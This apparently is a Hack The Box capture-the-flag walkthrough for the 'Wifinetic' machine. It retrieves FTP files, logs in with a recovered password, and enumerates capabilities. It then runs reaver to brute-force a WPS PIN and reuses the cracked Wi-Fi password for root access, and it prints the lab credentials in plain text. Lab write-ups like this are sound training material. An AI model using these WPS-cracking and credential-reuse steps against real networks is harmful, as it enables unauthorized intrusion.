---
date: 2025-01-20
categories: [CTF, HTB]
title: "HTB - Wifinetic"
tags: ['nmap', 'privilege escalation', 'rce','wireless', 'wifi', 'wps', 'reaver']

description: "Wifinetic - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Wifinetic

NMAP

![image1](../resources/ce8446500e1f4547acd22cf85aed2fbd.png)


![image2](../resources/6ff6375347cd4e4682ac2f9f0dc49315.png)

- Get all the files:

```bash
mget *

```

![image3](../resources/5d8968e1beaf47e28211651c4a95d07a.png)

- Extract the .tar file - We get the /etc directory:

From the files we get these - which provides us a username and password to login


![image4](../resources/51ed7e9897e140a8940d0565de9c2024.png)


![image5](../resources/a4b8698506c74fa69f5c7e38cfe70af5.png)

```bash
ssh netadmin@10.129.229.90

```
**VeRyUniUqWiFIPasswrd1!**


![image6](../resources/0c646704891147a5aa4bd3917c184df9.png)


![image7](../resources/569a7bee5ff5431a9eaa9c2f60ee511e.png)

- Doing enumeration - we can see reaver is installed and has the cap_net_raw+ep capability set:
  
```bash
getcap -r / 2>/dev/null

```

![image8](../resources/0819691ac03641d486ddcd855914f838.png)


![image9](../resources/0ca1525dd7e64678a8279c1815dd1e8f.png)

```bash
iwconfig

```

![image10](../resources/3cf2308dcf1e45a79738409937b622ee.png)

- Wireless settings are typically stored in /etc/wpa_supplicant.conf, which is present, but netadmin can’t read it

![image11](../resources/7c15bd8a3ee64381a4327eb3e9e35e64.png)

```bash
iw dev

```

![image12](../resources/2227093ffb7646ecbff81424bc40888f.png)

- We can run reaver against the BSSID using mon0:
[https://outpost24.com/blog/wps-cracking-with-reaver/](https://outpost24.com/blog/wps-cracking-with-reaver/)

```bash
reaver -i mon0 -c 1 -b 02:00:00:00:00:00 -vv

```

![image13](../resources/c074960bf8cf49eab143ed5842afcb63.png)

- Got a password:
**WhatIsRealAnDWhAtIsNot51121!**

- Now we can try and see if that password is used for the root account:
  
```bash
ssh root@192.168.1.1

```

![image14](../resources/2b9deebae1eb404db05df91e5522e823.png)


![image15](../resources/30928906434842d2a768cedd09327c5d.png)

```bash
cat root.txt

```
- Or simply
  
```bash
su -
```

![image16](../resources/620d647e240d40bc999b4ff959ccb6a6.png)
